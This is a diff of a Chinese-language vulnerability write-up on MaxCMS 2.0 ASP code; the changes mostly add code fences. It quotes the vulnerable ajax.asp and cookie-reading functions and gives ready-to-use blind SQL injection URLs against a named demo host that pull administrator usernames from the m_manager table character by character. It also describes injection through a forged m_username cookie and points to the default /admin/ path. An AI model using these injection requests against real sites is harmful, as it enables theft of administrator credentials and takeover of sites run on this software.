@@ -18,6 +18,7 @@ ViewNums: 4065
 看代码
 
 incajax.asp
+```
 
 dim action : action = getForm("action", "get")
 response.Charset="gbk"
@@ -45,6 +46,7 @@ Sub scoreVideo(operType)
     if err then digg=0 : err.clear()
     if not isNum(id) then echoSaveStr "safe" else id=clng(id)
     ‘ 查询到digg，注意返回的内容
+```
 ……利用就很简单了，构造sql语句提交（默认结构是m_manager,m_username,m_pwd，根据返回的内容判断就可以了。如果构造的语句是正确的，就返回类似警告
 
 你提交的数据有非法字符，你的IP【xxxx】已被记录,操作
@@ -59,7 +61,7 @@ http://demo.maxcms.net/inc/ajax.asp?action=digg&id=1%20and%20(select%20top%201%2
 http://demo.maxcms.net/inc/ajax.asp?action=digg&id=1%20and%20(select%20top%201%20asc(mid(m_username,1,1))%20from%20m_manager)=99其实随便找个注射工具跑一下就ok了
 
 另外一处注射
-
+```
 Sub checkPower
     dim loginValidate,rsObj : loginValidate = "maxcms2.0"
     err.clear
@@ -74,7 +76,9 @@ End Sub其中
 
 Function rCookie(cookieName)
     rCookie = request.cookies(cookieName)
-End Function通过伪造cookie中m_username的值可以进行注射
+End Function
+```
+通过伪造cookie中m_username的值可以进行注射
 
 不过要知道后台管理目录，默认是/admin/，多个页面可以触发改函数
 比如 /admin/admin_ajax.asp
